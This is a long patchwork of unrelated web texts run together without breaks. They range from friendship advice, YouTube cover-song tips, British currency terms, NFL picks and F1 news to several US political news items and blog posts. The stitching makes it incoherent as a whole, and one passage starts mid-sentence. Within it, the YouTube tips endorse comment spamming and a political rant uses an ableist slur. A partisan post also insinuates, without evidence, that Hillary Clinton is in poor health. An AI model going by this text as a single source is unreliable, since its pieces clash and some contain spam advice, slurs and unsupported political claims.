In order for you to make friends with a person, you both need to have enough time and energy to be able to socialize.
When you meet new people, make sure you're talking to someone who will have time for you. For example, if they're moving, having a baby, getting married, changing jobs, or just hanging out with too many friends already, then they just won't have time.
As you talk to them for the first few times, you'll get a sense of whether or not they're actively social, and whether or not they're open to having new friends.
Good First Conversations
The first conversation you have with someone is critical to building a new friendship. However, don't rush to think that you need to impress people, or have an amazingly interesting conversation.
All you need is a pleasant, relaxed conversation. Small talk is your best bet here.
It's about going from subject to subject, knowing that all subjects are related. You also want to keep it light; no need to go into the details of subjects.
Use small talk to create a level of comfort, without being too serious, too soon.
Being Sociable & “Responsive”
People love those who are engaged in the conversation with them. If you seem aloof to someone, he or she will think you're not interested in making friends.
You actually need to show some interest in what the other person is saying, even before they say it.
If you want to be friends with someone, you have to notice their emotional state and take that into account when you talk to them.
Having Things In Common
Friendship works in a way that you need to have things in common with someone to be friends with them. I could teach you how to find commonalities with people you meet, but if you don't find any, you don't have to spin your wheels.
Many people think that in order to be social, they “have to” get interested in subjects they don't enjoy, like sports, or TV. Of course you don't; there are people with the same interests that you have, also looking for new friends.
Again, small talk helps you here. If you talk to someone about many different subjects, stories, and share your opinions, you'll start to see similarities you have with them. This is why it's important to keep the conversation flowing, and not hang on to a single subject.
Building Trust From The Start
When you meet someone new, and want to build a friendship with him or her, there has to be some basic trust from the start. Friendship works in a way that you need to have a sense of “we get each other.”
The way you do this is to be a little more open about who you are, about your stories, and your silly secrets or pet peeves.
You don't need to share your heavy secrets, but share a little more private information than you would share with someone you're not interested in meeting again.
As a rule of thumb: be 5% more open than usual.
This will improve your chances of turning a stranger into a friend.

You may have noticed that most of the most famous singers and musicians on Youtube tend to record cover versions of songs quite often. That is not by mistake. The more cover songs you record, the more traffic your channel will get and you might eventually rank on the first page for a popular song (in that case, you can literally become famous overnight)
Tips When Recording Cover Songs
1. Stick With Covering The Most Popular, And Latest Songs
Don't bother recording covers of songs that are a few years old. Sure, you might do a great job, but if you get no traffic to your video, then what is the point? What you want to do is capitalize off of the most highly searched, popular songs out there. That way, when people search for a particular song, you may get some of that internet traffic to trickle down to your video. If Justin Bieber releases a song, try do do a unique cover version of it right away. They key to be unique. If Pitbull releases a lame club track but it is all over the radio, then why not do a cover of it in a totally different way that will captivate your audience. Maybe turn it into a rock ballad, or just piano and vocals. Set yourself apart from everyone else, and you will gain more and more subscribers to your channel.
2. Only Record High Quality Cover Songs
Don't record a lame a cappella of a song just for the sake of putting out a video. Really try to take your time crafting a unique cover version. Produce it well, record it professionally and make a video for it. The video can be simple such as just singing in front of a mic. But remember, avoid singing a cappella unless you are really going to blow away your audience. Lip sing along with your professional, pre-recorded version, just like all the music videos out there. People want to hear professional, perfect sounding, tuned vocals and recordings. That's just what they are used to. If your videos are not up to standard, then why would you expect anyone to subscribe to you?
3. Record A High Quality Video
As for the video quality, the same rule applies. Don't record a video with your phone. In the worse case, at least use an HD camcorder in a well lit room. If you can afford it, record a video using a professional DSLR camera. Using a DSLR camera will give you a highly polished look due to the depth of field effects you can achieve and the low light recording capabilities of such cameras in comparison to consumer camcorders. If your camera has the option, record it at 24p (24 frames per second, for a more cinematic look). Probably the most popular DSLR out there right now is the Canon Rebel T4i. There are pretty good deals out there on the older versions as well (T2i, T3i). If you are looking for a more compact camera, nothing quite beats the Sony NEX series (it's a micro thirds camera, not a full DSLR, but the quality is outstanding as it has an interchangeable lens).
4. Promote Your Own Music
The whole point of recording cover songs is to gain traffic and subscribers to your channel. If you put at least 1 cover song video up per week, you will be gaining at least a few subscribers here and there until your career takes off. In between recording and uploading cover songs, put your own unique music videos. Videos that you fully own, you can monetize on youtube by signing up with a Google Adsense account. You will basically get paid a little bit per views and per people who click on ads on your videos. Just think, if you go viral one day, you could earn serious money (It has been speculated that internet sensation PSY earned over $8 Million Dollars for his Gangnam Style Video). Cover songs, unfortunately you cannot earn money on, but each new subscriber that you gain on your channel will eventually pay off in the long run.
5. Comment And Connect With People
It's ok to do a little bit of comment spam. If you just recorded an incredible version of the latest Demi Lovato song, why not go to her channel and comment on her video every few hours. Say something like (Hey guys, I'm 18 and I'm a struggling singer. I really love Demi and just did a cover of this song. It would mean a lot to me if a few people could check it out). Many people hate this kind of comments and may just go to your video to leave a nasty comment. Don't worry, that's ok. Believe it or not, many people will check out your video and if they like what they see and hear, they will subscribe. And of course, share your video anywhere you can (Facebook, Twitter, Tumbler, Blogs, Forums, etc). If you have a great video, don't be afraid to share it and ask people to help you share it on their social networking pages as well. Every little bit helps.
Pro-amnesty demonstrators block an intersection outside the U.S. Capitol on Sept. 12, 2013 to protest congressional inaction on comprehensive immigration reform. (AP photo)
(CNSNews.com) – U.S. Rep. Steve King (R-IA) introduced legislation last week that would end the current informal sanctuary policy and enable the Capitol Police force to enforce federal immigration law on the grounds of the U.S. Capitol.
The bill, called the “Ending the Sanctuary Capitol Policy Act of 2015,” would modify existing law and explicitly give the Capitol Police jurisdiction to detain immigration law violators by adding the phrase “within the District of Columbia… with respect to any violation of the immigration laws, if the officer is in the performance of official duties when the authority is exercised.”
“The immigration system in the United States has an enforcement problem. The lawlessness of the Obama Administration has trickled down to at least 340 local so-called ‘sanctuary' jurisdictions that openly defy federal law and release dangerous criminals," King said in a press release.
“This lawlessness has even invaded the Capitol grounds where the laws are written,
“The Capitol Police, a federal law enforcement agency, do not have explicit statutory authority to enforce our immigration laws.
"Without clear authority they are not investigating the immigration status of protesters openly claiming they are here illegally while disrupting Committee proceedings and shutting down Congressional offices,” King continued.
“My bill..., simply empowers a federal law enforcement agency to enforce federal law. The House and Senate cannot call for an end to sanctuary cities while their offices serve as sanctuaries for lawlessness.
"The Rule of Law rests on reliable enforcement everywhere and Congress needs to take the sanctuary plank out of its own eye,” he said.
The bill has seven original co-sponsors including Reps. Brian Babin (R-TX), Lou Barletta (R-PA), Mo Brooks (R-AL), Jeff Duncan (R-AL), Louie Gohmert (R-TX), Paul Gosar (R-AZ), and Lamar Smith (R-TX).
But Omar Padilla, 3rd vice chair of the Iowa Democratic Party, criticized the bill in a press release: “Iowa Democrats are proud to stand with immigrant families and fight for comprehensive immigration reform.
“Instead of working toward commonsense solutions for immigrant families, Steve King has once again turned to hate. His desire to silence immigrant voices is a new low for a politician whose intolerance knows no bounds. Iowa Democrats stand in strong opposition to this bill, and King's offensive views on immigrants.”
The portion of the District of Columbia which is not directly under Federal jurisdiction currently has a sanctuary city policy.
List of British banknotes and coins, with commonly used terms.
Coins [ edit ]
Prior to decimalisation in 1971, there were 12 pence (written as 12d) in a shilling (written as 1s or 1/-) and 20 shillings in a pound, written as £1 (occasionally "L" was used instead of the pound sign, £). There were therefore 240 pence in a pound. For example, 2 pounds 14 shillings and 5 pence could have been written as £2 14s 5d or £2 14/5.
The value of some coins fluctuated, particularly in the reigns of James I and Charles I. The value of a guinea fluctuated between 20 and 30 shillings before being fixed at 21 shillings in December 1717. These are denominations of British, or earlier English, coins – Scottish coins had different values.
Visualisation of some British currency terms before decimalisation
Notes:
Denomination issued for use in the colonies, usually in Ceylon, Malta, and the West Indies, but normally counted as part of the British coinage.
The medieval florin, half florin, and quarter florin were gold coins intended to circulate in Europe as well as in England and were valued at much more than the Victorian and later florin and double florin. The medieval florins were withdrawn within a year because they contained insufficient gold for their face value and thus were unacceptable to merchants.
1915 half sovereign
1560–61 halfpound, one of the first English milled coins
1740 Two guineas
Decimal [ edit ]
Since decimalisation on "Decimal Day" in 1971, the pound has been divided into 100 pence. Originally the term "new pence" was used; the word "new" was dropped from the coinage in 1983. The old shilling equated to five (new) pence, and, for example, £2 10s 6d became ​£2.52 1⁄ 2 . The symbol for the (old) penny, "d", was replaced by "p" (or initially sometimes "np", for new pence). Thus 72 pence can be written as £0.72 or 72p; both were commonly read as "seventy-two pee".
Banknotes [ edit ]
Note: The description of banknotes given here relates to notes issued by the Bank of England. Three banks in Scotland and four banks in Northern Ireland also issue notes, in some or all of the denominations: £1, £5, £10, £20, £50, £100.
British banknotes: Pre-decimalisation British Notes: Name Value Circulation Notes Ten shilling note 10/-(£0.5) N non-circulating Originally issued by the treasury in 1914. Replaced by Bank of England notes from 1928. Commonly known as "ten bob note" or "half a quid". 1914–1970. Post-decimalisation British Notes: Name Value Circulation Notes £1 note £1 N non-circulating Withdrawn in 1988, it is still issued by the Royal Bank of Scotland, Bank of Ireland and still used in some of the Channel Islands.[ citation needed ] £5 note £5 Y in circulation The original "large white fiver" five pound note was known as "five jacks" and replaced in 1957 by the blue £5 note. Now also known as a "fiver". £10 note £10 Y in circulation Also known as a "tenner", or an "ayrton", from Ayrton Senna £20 note £20 Y in circulation Also known as a "score". £50 note £50 Y in circulation Also known as a "bullseye". £100 note £100 Y in circulation Issued by Scottish and Northern-Irish banks only. £1,000,000 note £1,000,000 N non-circulating Used as backing for banknotes issued by Scottish and Northern Irish banks when exceeding the value of their 1845 reserves. The amount to be covered is over a billion pounds.[11] Also issued in 1948 as a temporary measure during the postwar reconstruction in the Marshall Plan.[12] £100,000,000 note £100,000,000 N non-circulating Used as backing for banknotes issued by Scottish and Northern Irish banks when exceeding the value of their 1845 reserves. The amount to be covered is over a billion pounds.[11]
Bank of England notes are periodically redesigned and reissued, with the old notes being withdrawn from circulation and destroyed. Each redesign is allocated a "series". Currently the £20 and £50 notes are "series F" issue whilst the £5 and £10 notes are "series G" issue. Series G is the latest round of redesign, which commenced in September 2016 with the polymer £5 note and September 2017 with the polymer £10 note. The series G polymer £20 note will be released by 2020.[13]
We truly are not a serious country:
Too much Leonard Nimoy […..] But his intellectuality has contributed to a growing critique that decisions are detached from rock-bottom principles. Both Maureen Dowd in The New York Times and Joel Achenbach of The Washington Post have likened him to Star Trek's Mr. Spock. The Spock imagery has been especially strong during the extended review Obama has undertaken of Afghanistan policy. He'll announce the results on Tuesday. The speech's success will be judged not only on the logic of the presentation but on whether Obama communicates in a more visceral way what progress looks like and why it is worth achieving. No soldier wants to take a bullet in the name of nuance.
Yes, serious people are engaging in serious discussions about how bad it is for Obama to be intelligent, circumspect and deliberative. … After eight disastrous years that should have proved to anyone with a pulse who wasn't on a respirator how galactically retarded it is to elect a dim-witted, ivy-league C-student frat guy to run the country.
Fucking hell… Stuff like this, along with reading Idiot America, is pretty depressing to take in.

A few things happened in my Dungeons and Dragons world in the past few weeks. First, my Dungeon Master moved to Oxford so our (half-queer) game went digital. Second, since a friend and I longed for a physical, real-tabletop gaming experience once again, we decided I should DM for a group of our writer friends. I anticipate good things from a group where five of six members have graduate degrees in fiction. As a player, I always roll butch lesbians because I think I deserve to see myself reflected in tales of other worlds. And that's the beauty of playing a tabletop RPG—you can just do that. But now that I'm DMing, I have the power to do more. SO. MUCH. MORE. I can write the gayest NPCs, encounters and storylines in the history of the world. I'm mad with power. But the question remains: how much is too much? You tell me.

Today we are proud to announce the formal release of Pure 0.6.0. For over a week we let a release candidate circulate in the wild, with no significant problems reported. Thus, the release notes for 0.6.0-rc-1 should suffice.
The biggest change to Pure in 0.6.0 is the new Menu construct. With its low-specificity selectors, it's much easier to customize. All of the examples have been updated, and we've included two new responsive layout examples. The new menu is not backwards-compatible with the old menu, but in most cases it should be easy to migrate from one to the other by adding in .pure-menu-item and .pure-menu-link classes.
Also, we managed to roll in fixes for all outstanding bugs, and to close about two-thirds of open issues.
The response has been overwhelmingly positive, and we've received some great critical suggestions. Please submit feedback at http://github.com/yahoo/pure/issues.

It's the day after All Hallows Eve. A deep fog and unforgiving chill sweep over a depressingly dreary city riddled with corpses. You enter a gigantic, gaping, ominous structure that surely could not have been created by the hands of man.
You've been here before. The macabre reputation of this wretched place is all too familiar. Your skin crawls like a million insects the instant you enter. Many of your allies have met a grisly fate within this frightening structure and returned home as hollowed-out corpses. Your close your eyes and hear the haunting moans from years past. The copper smell of long-dried blood creeps into your nostrils the moment you set foot on this cursed ground.
And then you see them. The ghouls and spirits that had their fun the night before are supposed to be gone by now, but the group of wicked creatures you encounter in this unholy place are somehow even worse. Their hideous garb is stained the colors of hellfire and a shade of blue darker than the souls that used to inhabit their bloated bodies. Thousands upon thousands of these grotesque creatures are packed on top of each other in this abysmal arena, reeking of the dead flesh they feast upon for days on end. They join together to chant in tongues and worship their pagan gods. These ferocious fiends have appeared from the ether for exactly one reason: to revel in your demise.
Next, you see the opponents you are set to do battle with on this unearthly enclosure. Decades ago, this army of Monsters destroyed everything in their path. Today, these zombies aimlessly shuffle about as they endure defeat after defeat. This once proud and fearsome tribe is now led by a lifeless, soulless shell, completely dead in the eyes and devoid of any human emotion.
Anywhere else, dispatching these facile foes would be a simple task. But for some reason, this ground affords them powers you are helpless to overturn. You try to run, but the uneven earth opens up beneath you to swallow you whole. You launch your trusted aerial assault only to have your weapons fall harmlessly to the ground or intercepted by your enemies. Your once fortified defenses wither away like an unkempt garden in winter. You try to gather your wits for even a fleeting moment but your senses feel as though they were wired backwards. Your eyes dart back and forth, desperate to glimpse any sign of life, but even the clocks are dead. Time stops once you enter this forsaken field, trapping you in its vortex forever.
You slowly come to the realization that defeat is inevitable. Everything goes dark. You succumb to death's icy grip and fade away into oblivion. The unthinkable nightmare you have suffered from for most of the past decade has once again come true.
[End scene]
As Chris already touched on Wednesday, it's incredibly fitting that the Vikings will visit the Chicago Bears on Halloween weekend. Soldier Field has truly been a house of horrors for the Minnesota Vikings, who are 1-13 in their last 14 visits to the Windy City. So what can the Vikings do to reverse the curse?
Holding onto the ball would certainly help. The Vikings have forced 13 turnovers during their current seven-game Chicago losing streak, which is a pretty respectable number until you find out they still have a -5 turnover margin in those games. In the Week 7 Stock Market Report I was a little tough on Teddy Bridgewater by saying he could have avoided taking a couple of the sacks he endured against the Lions. But you know what? It's certainly better than heaving it up and turning the ball over on the road. Bridgewater lived up to his #GUMP nickname because he really was great under major pressure in Detroit. He faced it on 21 of his 39 dropbacks according to Pro Football Focus and went 12/17 for 149 yards and a score in those plays.
And yes, Bridgewater is going to face more pressure on Sunday. The Minnesota offensive line would allow pressure from just about anyone these days but this Bears team can get after the quarterback a bit. Chicago's pass rush starts with Pernell McPhee, who has been an absolute beast this season. Remember the horrific experience T.J. Clemmings had against Von Miller in Denver? Don't be surprised if McPhee gives Clemmings just as much trouble:
I'm guessing Baltimore wishes they had McPhee back this season. But other than McPhee, nobody on the Bears front seven stands out above the pass rushers the Vikings have already faced this season. So if the offensive line can buy enough time for Teddy to see the field, there should be all sorts of opportunities for Stefon Diggs to continue the ridiculous run he's on. Chicago isn't giving up a ton of yards through the air but they have allowed the third highest quarterback rating in the league. The days of the ball-hawking, hard-hitting Bears secondary are long gone.
I promise I'm not trying to jinx Teddy into throwing five picks on Sunday here. I fully realize the game is still being played at Soldier Field. But the Bears are tied for the most points allowed per game for a reason. The defense just isn't that good.
The offense still has a few weapons though. We all know how Matt Forte can carve you up on the ground or in the passing game. We all know that Martellus Bennett is a big matchup nightmare. We all know that Brandon Marshall is gone but Alshon Jeffery can still make some ridiculous catches in traffic:
And we all know that America's favorite harbinger of apathy, smokin' Jay Cutler, will continue to be his mediocre self. Yet he hasn't lost to the Vikings at home in his career because he always seems to play just a little better against them at Soldier Field.
One way to prevent Cutler from excelling on Sunday is giving him the Matthew Stafford treatment. Chicago's offensive line is every bit as shaky and beat up as the line Minnesota will be trotting out. The Bears start our old pal Vladimir Ducasse at right guard--on purpose! Left tackle Jermon Bushrod should probably be back for his first game since Week 3 but it's not like he was playing at an All-Pro level when he got knocked out. The Vikings should be able to wreak havoc on Cutler even without the services of Sharrif Floyd, who will likely miss his second straight game. The defense will continue their impressive season if they can accomplish these three things:
Limit the damage from Jefferey and Bennett. Hey Xavier Rhodes, Sunday would be a great time for your first great game of the season! You were kind of supposed to make "the leap" this year and it hasn't really happened yet. Let's try to end up with more passes defended than penalties this time around. Get to Cutler early and often. Just to make sure they pound out any residual caring that might be rattling around in there. Prevent little plays from turning into big plays, especially on crossing routes. The Vikings got burned early last week by not picking up players over the middle; the Bears have the personnel to make it hurt if given space to work with.
I'm sick of talking about this losing streak. I'm done with having only two wins this century in a place that has been much more conducive to victory for many other teams. I'm not listening to the fact that John Fox is so great in his career coming off a bye week.
For on Sunday, it will no longer be All Hallows Eve. It will technically be All Saints Day, but they suck so we'll just call it All Vikings Day instead. And on All Vikings Day, all Vikings will finally band together and break the curse. Blood will be shed no more. The evil that surrounds this foul place will be sent back to the underworld. For if there was ever a man that could exorcise the Vikings' demons hovering over Soldier Field, it's Mike Zimmer.
"THE POWER OF RED MAN COMPELS YOU! THE POWER OF RED MAN COMPELS YOU! THE POWER OF..."
Prediction
Vikings 27, Bears 20
And now for the rest of my Week 8 NFL picks (home teams in ALL CAPS):
PATRIOTS over Dolphins
The Legend of Dan Campbell has been a fun story so far, but this chapter isn't going to be as fun for Miami fans.
CHIEFS over Lions
Another blockbuster matchup the NFL is making London fans endure. No matter what happens, at least someone that the Vikings have already beaten this season will actually get a win!
FALCONS over Buccaneers
My Survivor Pool pick of the week, now 5-2 after the Cardinals hung on against Baltimore Monday night. The good news for Tampa is that they won't have a 24-point lead to piss away this week.
STEELERS over Bengals
This 100% hinges on Ben Roethlisberger playing. If he doesn't play, I'm switching this pick. If he does play, I'm finally getting Antonio Brown back as a viable fantasy play!
Cardinals over BROWNS
Chris Johnson is having the most unlikely comeback since Surge soda. I have no idea how either one happened but I guess they're both kind of fun to talk about.
TEXANS over Titans
The winner of this game will be within striking distance of the division lead. The AFC South is worse than Surge soda.
RAMS over 49ers
I think it's very possible that Todd Gurley AND the Rams defense outscore Colin Kaepernick by two touchdowns in this game.
Giants over SAINTS
Because I refuse to live in a world where this Saints team has a .500 record.
RAVENS over Chargers
It's the dueling banjos of horribly disappointing AFC teams! Let's just go to the Gratuitous Picture of the Week before these two fan bases get any more depressed.
"Will we ever have the higher score? / Even this parrot's saying 'nevermore'!" (image via baltimoresun.com)
RAIDERS over Jets
Raise your hand if you thought these two teams would have four more wins than the two teams in the game I just picked. If this were any other year I'd have at least a dozen punchlines ready for both teams. Instead, this is simply a pretty good late afternoon matchup with possible Wild Card implications. It feels super weird.
Seahawks over COWBOYS
Screw you, Greg Hardy.
Packers over BRONCOS
It's either going to be "THIS GAME SYMBOLIZES THE PASSING OF THE TORCH TO THE NEXT GREAT QUARTERBACK!" or "PEYTON MANNING MIGHT NOT BE WASHED UP YET!" Either way, I'm going to be
♫ HIT-ting-mute-on-Coll-ins-worrrth ♫
PANTHERS over Colts
Does Carolina play in the AFC South? No? They play in the NFC South? Then yeah the Colts can't beat them.
Last week: 13-1 (not bad!)
Season so far: 65-40 (not great!)
Jenson Button has dismissed suggestions he is chasing one final big pay-day, with the feeling of being wanted and a love of the sport far more important than money as far as his future is concerned.
With Fernando Alonso due to be confirmed next week as a McLaren driver on a two-year deal, with the option of a third, the battle for the second seat comes down to a straight fight between the experience of Button or the youth of team-mate Kevin Magnussen.
Paddock sources have suggested whilst racing director Eric Boullier favours Button, Group CEO Ron Dennis prefers Magnussen, and it is the latter who will ultimately have the final call.
Button, though, did his cause no harm with a stunning performance over the course of the Brazilian Grand Prix weekend, qualifying fifth and finishing fourth.
The veteran 34-year-old may be level with Magnussen when it comes to qualifying - nine apiece - but he has scored almost double the Dane's number of points - 106 to 55 - proving his racecraft is superior.
With Honda due to return as power-unit suppliers, the suggestion is Button's greater experience, in tandem with Alonso, would provide McLaren with a more solid platform on which to build.
Dennis, though, sees Magnussen as a world champion in the making, which he claimed following the rookie's superb debut in Australia at the start of the year when he was second.
As far as Button is concerned, whoever employs him next it will be because they have made it clear they want him on board, with money "not the issue in any way, shape or form".
In a clear hint to Dennis and McLaren, Button added: "Whether I'm racing here or somewhere else, I will do it because I love it.
"Naturally I still want to earn money because I feel I have achieved and I feel I should get paid for what I do in an F1 car or a racing car, and for what I bring to a team.
"But I'm not a driver that takes the piss, and I will race somewhere even I'm if not getting the big bucks like a few drivers who are out there.
"You should get what you deserve. I feel I bring a lot to a team, not just in terms of results, but in terms of marketing within a team and working with sponsors, and how I can help develop a car.
"You want to feel like you are wanted within a team and part of the family."

If you have other interesting programming quotes to add, you may share them with us via comment.
Donald Trump pledged on Saturday to sue all of the women who have come forward to accuse him of sexual assault.
The Republican presidential nominee made the vow during a planned policy speech in Gettysburg, Pennsylvania, a town from where Abraham Lincoln gave his celebrated address during the Civil War.
Trump's address was billed as an outline of his first 100 days as president. But he opened by again complaining that the election was rigged against him and then attacked the several women who accused him of sexual assault this month.
“Every woman lied when they came forward to hurt my campaign. Total fabrication,” Trump said. “The events never happened. Never. All of these liars will be sued after the election is over.”
Trump also said that the United States would pay for a wall with Mexico “with the full understanding” that the Latin American country would reimburse it for costs. It's a small, but noticeable tweak in Trump's signature campaign policy. He had previously simply said that Mexico would pay for the wall.
The brash businessman announced that as president he would block a pending deal between AT&T and Time Warner, saying “deals like this destroy democracy,” and it was “too much concentration of power in the hands of too few.”
Trump did eventually get around to discussing his policy proposals for his first 100 days in office. These would include a constitutional amendment imposing term limits on members of Congress, a hiring freeze in the federal workforce and lobbying bans on former congressional and White House officials, he said.
Echoing Republicans' 1994 “contract with America,” Trump described his plan as a contract between himself and the American people. He had unveiled many of these proposals previously.
Democratic presidential candidate Hillary Clinton's campaign said in a statement that the speech illuminated what a Trump State of the Union speech would be like.
“Today, in what was billed as a major closing argument speech, Trump's major new policy was to promise political and legal retribution against the women who have accused him of groping them,” said Christina Reynolds, the campaign's deputy communications director.
“Like Trump's campaign, this speech gave us a troubling view as to what a Trump State of the Union would sound like ― rambling, unfocused, full of conspiracy theories and attacks on the media, and lacking in any real answers for American families.”
This article has been updated to include comment from the Clinton campaign.
South Works
by Jacob Kaplan
Along Lake Michigan on the Southeast Side of Chicago lies a huge empty tract of land. Probably the largest vacant parcel of land in the city, it was formerly home to the U. S. Steel South Works, the largest integrated steelmaking operation in Chicago. Almost 20,000 people were once employed where empty fields of concrete and rubble now sit.
The story of the South Works reads as a microcosm of the rust belt. First opened in 1882 as the North Chicago Railway Mill Company, the mill went through several name changes before becoming the U.S. Steel South Works. The placement of the steel mill at the mouth of the Calumet River at Lake Michigan made for easy transport of goods and raw materials. The neighborhood that developed around the mill, South Chicago, was filled with immigrants of all types who came to the area for the well-paying jobs at the mill. However, the prosperity did not last forever, and due mainly to market forces affecting the entire United States steel industry, the South Works began a long period of downsizing beginning in the 1970s. Finally, on April 10, 1992, the doors closed for good. The mill that once produced steel beams for most of Chicago's skyscrapers and jobs for thousands of area residents was now gone, and with it went the prosperity of South Chicago. With each round of job cuts at the mill, the neighborhood had become more and more economically depressed. Once the South Works closed, South Chicago spiraled into major decay, a trend that has yet to be reversed.

Left: Library of Congress Prints and Photographs Division, LC-D4-10460 L, 1890-1901. Right: Charles Cushman, Indiana University Archives, 1958.
Much speculation has been put into what to do with the site since its closure almost 15 years ago. Plans have come and gone, but the basic idea remains, a mixture of industrial, commercial and residential with new parkland along the lakefront. Solo Cup, Co. had plans to build a large factory on a portion of the site but recently pulled out and is trying to find someone else to develop their portion of the land. In 2004, a large project commenced to provide topsoil for the lakefront park using dried mud from the bottom of Lake Peoria in Downstate Illinois. Also, new roads were built for the relocation of U.S. Route 41, which will eventually be routed through the site. Development on the South Works site has generally been slow in coming, however, and it will likely be a long time before the site is completely redeveloped.
There are very few remnants of the plant. Aside from the gatehouse, which is occupied by a guard, all that remains is the slip, and two large concrete masses.

or how long the redevelopment takes, one can only hope that a substantial tribute to the history and industrial heritage of the U.S. Steel South Works will be incorporated into the site. The place where the steel was produced for the John Hancock Building, Sears Tower and countless other Chicago skyscrapers deserves more than a couple historic markers.

WASHINGTONWASHINGTON (Reuters) - A bipartisan group of U.S. senators introduced legislation on Wednesday that would lessen prison sentences for non-violent drug offenders, reviving a similar effort that failed to become law last year.
The bill would narrow the scope of mandatory minimum drug sentences so they would apply only to violent criminals or serious drug offenders.
It also contains provisions that aim to help non-violent inmates become rehabilitated so they can re-enter society.
ADVERTISEMENT
Senate Judiciary Committee Chairman Charles Grassley, who rolled out the bill with a group including senior Judiciary Committee Democrat Dianne Feinstein and Republican Lindsey Graham, said it represented "the product of much thoughtful deliberation."
"This bipartisan compromise ensures that these consequences fit their crimes by targeting violent and career criminals who prey on the innocent while giving nonviolent offenders with minimal criminal histories a better chance to become productive members of society," Grassley said.
Lawmakers failed last year to pass criminal justice reform, an issue that had been central to former Democratic President Barack Obama's efforts to overhaul the system and reduce prison overcrowding.
It is unclear whether the bill will get support from Attorney General Jeff Sessions, who has made cracking down on violent crime, drugs and illegal immigration a focus since taking office this year under Republican President Donald Trump.
"The Department of Justice's mission is to prevent crime and maintain public safety and the longstanding practice of the Department is to fulfill that mission by charging the most serious readily provable offenses supported by the facts of the case," Justice Department spokesman Ian Prior said in a statement.
Sessions opposed last year's reform effort while he was a Republican senator.
ADVERTISEMENT
He issued a memo in May that reversed course from the Obama administration by telling U.S. attorneys they were now required to "charge and pursue the most serious, readily provable offense."
The policy shift is expected to trigger mandatory minimum sentences under laws passed in the 1980s and 1990s that critics say can wrongfully criminalize drug addicts and disproportionately affect low-income and minority communities.
Sessions is scheduled to announce an initiative to reduce violent crime at a news conference on Thursday morning.

At midnight on September 30, Dish Network dropped FOX Sports Detroit and in the immediate future, Dish customers risk missing the final weekend of the Tigers season, the Red Wings remaining two preseason games and next week's start of the regular season, as well as the Pistons preseason contest on Tuesday featuring LeBron James' debut with the Miami Heat.
In October and November alone, there are 41 Red Wings and Pistons games combined potentially at risk to Dish customers.
"FOX has been trying for months to reach a fair agreement, but Dish refuses to play ball," said Tim Bryant, FOX Sports Detroit spokesman. "Our programming is among the most valuable Dish offers, and we're simply looking for a fair deal."
Fortunately, there are alternatives, as Fox Sports Detroit is offered by a number of other local distributors in our area. Dish customers should visit www.getwhatipaidfor.com for more information.
Nationwide, Dish has dropped Fox's 19 regional sports networks, FX, and National Geographic Channel. On October 31, the satellite operator's agreement to carry Fox television stations also expires and includes WJBK-TV Channel 2 in Detroit. Other over-the-air Fox stations that may be affected are in Atlanta, Austin, Baltimore, Boston, Chicago, Dallas, Gainesville, FL, Houston, Los Angeles, Memphis, Minneapolis, New York, Orlando, Philadelphia, Phoenix, Tampa, and Washington D.C.
EXHAUSTED HILLARY Is Taking Off Weekends — And Media Is Covering It Up
Guest Post by Joe Hoft
By reviewing the activities of Presidential candidates Trump and Clinton a new phenomenon has appeared. While Trump continues to smash Clinton in attendance at events, Hillary appears to have decided to take weekends off.
Clinton took the weekend of August 6th and 7th off and she decided to take three days off this past weekend August 12th through 14th. She also has no events scheduled to participate in this coming Thursday through Saturday August 18th through 20th. This in essence would mean another three days off after three days of events scheduled starting today. In total Clinton has taken 7 days off in August out of the first 14 days and is scheduled to continue with this approach through at least this coming Saturday.
Donald Trump on the other hand has taken only two days off in August, Sunday August 7th and Sunday the 14th. Trump has 7 days where he has participated in more than one campaign event.
As previously noted, Trump has more than ten times the number of people at his campaign events than Hillary has at hers since August 1st. More than 100,000 people have shown up for Trump events since the beginning of August (with many more turned away due to the events reaching capacity). Hillary on the other hand hasn't even had one tenth of that or not even 10,000 show up at her events since August 1st.
Also, it is clear by just looking at the crowds at Trump and Clinton events that Trump has a movement and Hillary has barely a heartbeat.
Trump's largest event was in Ft Lauderdale, Florida, where it was estimated that the massive crowd there to see him was near 20,000. The largest crowd Clinton spoke at was in Washington, DC but this was a NABJ/NAHJ Event which had an estimated 4,000 in attendance. Hillary's largest event held by her campaign in August was back on August 1st in Omaha, NE when businessman Warren Buffett joined her and an estimated 3,000 locals. In total when looking at just the Clinton campaign events, barely 8,000 people showed up to the seven campaign events since August 1st.
Also, as previously noted in a related post, Trump is destroying Clinton on social media .
Trump is crushing Hillary in attendance at events as seen in pictures and in numbers, and in social media in tweets, Facebook shares and YouTube live streams.
It is unknown why Clinton is taking so much time off. Questions arise whether it is related to her terrible campaign event turnout or her poor health or some combination of both.
Maybe she is just exhausted as Trump noted in a recent speech.
Eco-friendly plastic bottles stoke recycling fight
Danny Clark's idea was simple: If he could make plastic water bottles biodegradable, it would reduce the impact on landfills, curb roadside litter and reduce the amount of plastic garbage that eventually washes into the oceans.
But the Mesa, Ariz., man's venture has run into opposition from a large and unexpected source: the $400 billion recycling industry, which fears that making plastic bottles biodegradable will reduce the stream of plastic refuse used to make everything from carpet to clothing to new bottles. In addition, the industry fears that changing the makeup of plastic bottles could make it more difficult to recycle them.
With plastic-bottle sales already slowing and only a small amount being recycled, the industry is meeting threats to its profits head-on, actively campaigning against attempts by companies like Clark's to make bottles biodegradable.
GREEN HOUSE: Our online envrironmental community
Billions of plastic bottles, which take millions of barrels of oil to produce, appear on supermarket shelves every year, according to the U.S. Energy Information Administration. Only about 28% of bottles manufactured in the U.S. end up being recycled, the Association of Postconsumer Plastic Recyclers said.
The other 72% wind up in landfills or as litter. Environmentalists point to a phenomenon known as the "Great Pacific Garbage Patch," a floating island of discarded plastic debris that is twice the size of Texas and held together by swirling ocean currents, as an example of the proliferation of plastic pollution.
Clark, who said he is trying to leave "a legacy that we've done something positive in the environment," was inspired to quit his job as a communications engineer to form a team of microbiologists and polymer chemists to develop his bottle technology three years ago.
"Bottles are a big issue. It's talked about, and it's pretty visible," Clark said.
He launched his start-up, Enso Bottles, in 2008 and says he has come up with a truly biodegradable and recyclable polyethylene terephthalate, or PET, plastic bottle.
PET is used to make a wide range of products, particularly packaging containers for consumer goods, such as water and soda bottles. Traditional plastic PET bottles can take hundreds of years to break into smaller pieces, but those pieces never actually decompose.
Clark's company produces an additive used in the plastic-manufacturing process and says on its website that independent testing data show bottles start to biodegrade in as little as 250 days in a controlled environment or as long as five years in the elements. In addition, Clark's data show that the additive doesn't diminish the quality or effectiveness of the plastic, he says.
Clark said that technologies allowing plastics to biodegrade have been around for several decades but had not been applied to PET bottles.
